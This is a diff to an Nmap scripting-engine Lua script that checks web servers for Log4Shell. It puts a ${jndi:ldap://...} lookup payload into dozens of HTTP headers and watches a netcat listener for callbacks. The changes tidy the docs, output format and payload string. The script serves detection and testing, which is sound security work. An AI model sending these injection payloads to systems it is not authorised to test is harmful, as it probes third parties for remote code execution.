@@ -33,7 +33,8 @@ Method A:
 
 Method B:
     - Listen a TCP port with netcat (or ncat):
-        ncat -v -k -e /bin/true -l 1389
+        ncat -vkl 1389   # Ncat
+        nc -lvnp 1389    # Netcat
 
     - Run Nmap with --script log4shell.nse script
         nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
@@ -41,10 +42,9 @@ Method B:
     - See the target IP address in netcat (or ncat) output:
         Ncat: Connection from 172.17.0.2.
         Ncat: Connection from 172.17.0.2:38898.
-
 ]]
 
-author     = 'giuseppe DOT diterlizzi AT nttdata DOT com'
+author     = 'Giuseppe Di Terlizzi <giuseppe DIT diterlizzi AT nttdata DOT com>'
 license    = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"vuln", "safe", "external"}
 
@@ -55,27 +55,43 @@ categories = {"vuln", "safe", "external"}
 -- @args log4shell.http-headers     Comma-separated list of HTTP headers
 -- @args log4shell.http-method      HTTP method (default: GET)
 -- @args log4shell.url-path         URL path (default: /)
+--
 -- @output
 -- PORT   STATE SERVICE
 -- 80/tcp open  http
 -- | log4shell: 
--- |   Payload: ${jndi:ldap://172.17.42.1:13890/log4shell/172.17.42.2/8080}
+-- |   Payload: ${jndi:ldap://172.17.42.1:13890/log4shell}
 -- |   Path: /
 -- |   Method: GET
 -- |   Headers: 
 -- |     X-Api-Version: 200
 -- |     [...]
 -- |_  Note: (!) Inspect the callback server (172.17.42.1:13890) or web-application (172.17.42.2:8080) logs
+--
+-- @xmloutput
+-- <script id="log4shell" output="[...]">
+--   <elem key="Payload">${jndi:ldap://172.17.42.1:13890/log4shell}</elem>
+--   <elem key="Path">//</elem>
+--   <elem key="Method">GET</elem>
+--   <table key="Headers">
+--     <elem key="X-Api-Version">200 </elem>
+--     <elem key="Referer">200 </elem>
+--     <elem key="User-Agent">200 </elem>
+--   </table>
+--   <elem key="Note">(!) Inspect the callback server (172.17.42.1:389) or web-application (172.17.42.2:8080) logs</elem>
+-- </script>
+--
 -- @changelog
--- 2021-12-11   First release
--- 2021-12-13   Test all headers known
---              Changed output format
---              Added log4shell.callback-server arg (instead of log4shell.exploit-server)
--- 2021-12-14   Added log4shell.http-headers arg
---              Improved output
--- 2021-12-15   Improved XML result
---              Added log4shell.http-method arg (default: GET)
---              Added log4shell.url-path arg (default: /)
+-- 2021-12-11 - First release
+-- 2021-12-13 - Test all headers known
+--            - Changed output format
+--            - Added log4shell.callback-server arg (instead of log4shell.exploit-server)
+-- 2021-12-14 - Added log4shell.http-headers arg
+--            - Improved output
+-- 2021-12-15 - Improved XML result
+--            - Added log4shell.http-method arg (default: GET)
+--            - Added log4shell.url-path arg (default: /)
+--            - Removed target info in LDAP URI
 --
 
 local http      = require "http"
@@ -97,7 +113,7 @@ action = function(host, port)
   local http_method     = stdnse.get_script_args(SCRIPT_NAME .. '.http-method') or 'GET'
   local url_path        = stdnse.get_script_args(SCRIPT_NAME .. '.url-path') or '/'
 
-  local exploit_payload = string.format('${jndi:ldap://%s/log4shell/%s/%s}', callback_server, host.ip, port.number)
+  local exploit_payload = string.format('${jndi:ldap://%s/log4shell}', callback_server)
 
   local payload_headers = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}
 
@@ -118,7 +134,7 @@ action = function(host, port)
       [payload_header] = exploit_payload
     }
 
-    local response = http.generic_request(host, port.number, http_method:upper(), url_path, { header = header, bypass_cache = true })
+    local response = http.generic_request(host, port.number, http_method:upper(), url_path, { header = header, no_cache = true })
     local status   = response.status
     local status_string = http.get_status_string(response)
 
